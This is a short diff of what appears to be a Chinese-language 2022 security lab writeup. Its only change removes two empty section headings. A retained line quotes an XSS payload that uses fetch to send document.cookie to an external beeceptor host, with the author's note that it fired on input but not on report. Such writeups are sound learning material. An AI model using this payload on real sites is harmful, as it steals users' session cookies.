@@ -25,11 +25,6 @@
     > 嘗試了一下 `</script><script>fetch("https://crazyfirelee.free.beeceptor.com?"+document.cookie);</script>` 會在 enter 之後直接送兩次 fetch 出來，但在 report 的時候不會觸發，還沒理解為什麼。
 
 
-## Simple Note - Lab
-
-
-## TodoList - HW
-
 ---
 ###### tags: `CyberSec` `Writeup` `2022`
 
